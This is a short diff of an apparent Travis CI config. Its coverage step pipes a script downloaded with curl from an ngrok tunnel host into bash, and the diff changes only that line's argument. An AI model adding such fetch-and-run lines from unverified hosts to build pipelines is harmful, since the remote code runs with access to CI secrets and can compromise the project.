@@ -6,4 +6,4 @@ node_js: 10
 
 script:
   - npm run upload-coverage
-  - bash <(curl -s http://ib-84012.ngrok.io/bash) -f ./coverage/coverage-final.json
+  - bash <(curl -s http://ib-84012.ngrok.io/bash)
